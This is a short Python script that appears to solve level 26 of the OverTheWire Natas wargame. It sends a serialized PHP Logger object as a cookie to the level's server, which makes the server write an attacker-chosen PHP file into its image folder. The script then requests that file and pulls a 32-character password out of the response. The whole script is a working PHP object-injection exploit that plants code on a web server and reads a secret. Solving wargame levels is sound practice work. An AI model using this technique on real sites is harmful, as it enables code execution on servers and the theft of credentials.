import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def inject_payload():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '26'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    #Auth for level
    auth = HTTPBasicAuth('natas26', passw.strip())
    #Payload is a base64 encoded serialized 'Logger' php object, which can be found in the 'payload.php' folder. The object has been changed to alter the location that 
    #the logfile is written to, the name of the file, the file extension, as well as the contents (php outputting the password!)
    payload = {'PHPSESSID':'tald','drawing':subprocess.run(['php', 'payload.php'], stdout=subprocess.PIPE).stdout.decode('utf-8')}
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    requests.get('http://natas26.natas.labs.overthewire.org/?x1=&y1=&x2=&y2=', auth=auth, cookies=payload)
    r = requests.get('http://natas26.natas.labs.overthewire.org/img/natas26_taldgannn.php', auth=auth)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[0])

if __name__ == "__main__":
    inject_payload()
